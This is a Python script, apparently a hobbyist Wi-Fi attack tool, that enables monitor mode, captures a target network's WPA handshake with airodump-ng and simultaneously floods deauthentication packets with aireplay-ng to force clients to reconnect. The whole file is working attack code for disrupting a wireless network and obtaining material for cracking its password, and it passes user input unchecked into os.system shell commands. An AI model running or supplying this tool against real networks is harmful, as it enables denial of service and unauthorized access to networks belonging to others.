#importing libraries,modules...,
import threading
import subprocess as sb
import os,time
#Entering Message 

def Deauth(package,bssid,interface):
    os.system(f"xterm -hold -e aireplay-ng --deauth {package} -a {bssid} {interface}")
def Handshake_Capture(bssid,channel,interface,path1):
    os.system(f"xterm -hold -e airodump-ng --bssid {bssid} --channel {channel} --write {path1} {interface}")
control_root=os.getuid()
if control_root==0:
    #---------------------------------ENTRANCE------------------------------------------------
    print("Welcome To Wifi handshake capturing tool by F1del\n[+]Please Stop Network Manager to before run the program")
    list_interfaces=[]
    interfaces=os.listdir("/sys/class/net")
    print("\n\nLoading...")
    time.sleep(1.5)
    os.system("clear")

    for i in interfaces:
        if i!="lo" and i!="eth0":
            list_interfaces.append(i)


    #----------------------------------MONITOR MODE------------------------------------------
    a=0
    while True:
        for j in list_interfaces:
            print(f"{a}. {j}")
            a+=1
        a=0
        


        try:
            inp=int(input("Choose an Interface : "))
            interface_=list_interfaces[inp]
            sb.call(["airmon-ng","start",interface_])
            os.system("clear")
        except:
            print("[-]You entered an Invalid argument") 

        if sb.getoutput(f"iwconfig {interface_}|grep Mode:Monitor")=="":
            print("[-]This interface isn't in Monitor Mode or Not supporting")
        else:
            break
    print("\n you should use CTRL^C later for closing Wifi list")
    time.sleep(2)

    #-------------------------------------DEAUTH-------------------------------------------------
    run=True
    while True:
        if run==True:
            if sb.getoutput("iwconfig {} | grep such".format(interface_))=="" :
                print("a")
                os.system("airodump-ng {}".format(interface_))
                run=False
            else:
                interface_=interface_+"mon"
                continue
        try:
            bssid=input("\nMAC : ")
            channel=int(input("\nChannel Num(CH):"))
            pkg_=int(input("\nHow many packages you want send ?(40-50 recommended) : "))
            os.system("clear")
            break
        except:
            print("[-]Invalid value")
            continue
    
    while True:
        try:
            f1le=input("Enter the File path (With filename and without file extension):-->")
            break
        except:  
            print("[-]Invalid Path for file")
            continue
    
    #THREADING FOR WIFI HANDSHAKE
    os.system("clear")

    th1=threading.Thread(target=Handshake_Capture,args=(bssid,channel,interface_,f1le))
    th1.start()

    
    time.sleep(3)
    th2=threading.Thread(target=Deauth,args=(pkg_,bssid,interface_))
    th2.start()


    os.system("clear")
    os.system("echo you can exit with CTRL^C when the wifi handshake/PMKID finds")


    th2.join()
    th1.join()
    while True:
        try:
            mon_inp=input("Dou you want to Close Monitor Mode ? (Y/N) : ")
        except:
            print("[-]invalid Operation")
            continue
        if mon_inp=="y" or mon_inp=="Y":
            os.system("airmon-ng stop {}".format(interface_))
            os.system("clear")
            print("[+]Monitor Mode closed successfully")
            break    
        elif mon_inp=="n" or mon_inp=="N":
            break
        else:
            print("[-]Invalid Value")
            continue
    print("[+]Program is Closing ...]")
    time.sleep(1)
else:
    print("[-]This program can be executable in root permissions !")